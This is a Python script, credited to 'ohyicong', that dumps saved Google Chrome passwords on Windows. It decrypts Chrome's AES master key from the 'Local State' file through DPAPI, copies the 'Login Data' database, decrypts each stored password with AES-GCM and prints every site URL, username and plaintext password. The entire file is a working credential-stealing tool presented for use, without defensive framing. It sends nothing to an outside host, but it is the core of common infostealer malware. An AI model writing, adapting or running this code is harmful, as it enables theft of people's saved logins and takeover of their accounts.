#Credits to ohyicong

import os
import json
import base64
import shutil
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
from datetime import timezone, datetime, timedelta


# color for pritty print
end        = "\033[0m"
bold       = "\033[1m"
red        = "\033[31m"
green      = "\033[32m"
yellow     = "\033[33m"
blue       = "\033[34m"
violet     = "\033[35m"
lightBlue  = "\033[36m"


def test_os():
    # test if running on windows?
    if(os.name == 'nt'):
        return True


def get_chrome_datetime(chromedate):
    """Return a `datetime.datetime` object from a Chrome format datetime
    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
    return datetime(1601, 1, 1) + timedelta(microseconds = chromedate)


def get_encryption_key():
    LOCAL_STATE_FILE_PATH = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    try:
        with open(LOCAL_STATE_FILE_PATH, "r", encoding="utf-8") as file:
            local_state = file.read()
            local_state = json.loads(local_state)

        # decode the encryption key from Base64
        encryptionKey = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        # remove DPAPI str from the key
        encryptionKey = encryptionKey[5:]
        # return decrypted key that was originally encrypted
        # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
        return win32crypt.CryptUnprotectData(encryptionKey, None, None, None, 0)[1]
    except:
        # Exit the program, since it seems like Chrome isn't installed
        os.system('cls')
        print("="*50)
        print("{}{}It seems like you don't have Chrome installed?{}".format(bold, red, end))
        print("="*50)
        exit()


def decrypt_password(password, key):
    try:
        # get the initialization vector (iv) from the password
        iv = password[3:15]
        password = password[15:]
        # generate a cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypting the password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # win32crypt isn't supported
            return ""


def main():
    # get the os
    if(test_os()):
        # get the AES key from OS
        key = get_encryption_key()
        # path to sqlite Chrome database path from the OS
        CHROME_DB_PATH = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")

        # copy the file to another location, as the db will be locked if Chrome is currently running
        chromeDb = "ChromeDb.db"
        shutil.copyfile(CHROME_DB_PATH, chromeDb)
        # connect to the db
        db = sqlite3.connect(chromeDb)
        cursor = db.cursor()
        # the table "logins" has the data we need
        cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
        # iterate over all rows from the select
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]        
            if username or password:
                os.system('cls')
                print("="*50)
                print("{}Origin URL:{}{} {}{}".format(bold, end, green, origin_url, end))
                print("{}Action URL:{}{} {}{}".format(bold, end, blue, action_url, end))
                print("{}Username:{}{} {}{}".format(bold, end, yellow, username, end))
                print("{}Password:{}{} {}{}".format(bold, end, red, password, end))
            else:
                continue
            if date_created != 86400000000 and date_created:
                print("{}Creation Date:{}{} {}{}".format(bold, end, lightBlue, str(get_chrome_datetime(date_created)), end))
            if date_last_used != 86400000000 and date_last_used:
                print("{}Last Used:{}{} {}{}".format(bold, end, lightBlue, str(get_chrome_datetime(date_last_used)), end))
            print("="*50)
            
        # close db cursor & connection
        cursor.close()
        db.close()
    else:
        os.system('cls')
        print("="*50)
        print("{}{}This program only works in Windows!{}".format(bold, red, end))
        print("="*50)
        exit()
    
    # cleanup
    try:
        # try to remove the copied db file
        os.remove(chromeDb)
    except:
        print("{}{}Couldn't remove the ChromeDb.db file.{}".format(bold, red, end))
        pass


if __name__ == "__main__":
    main()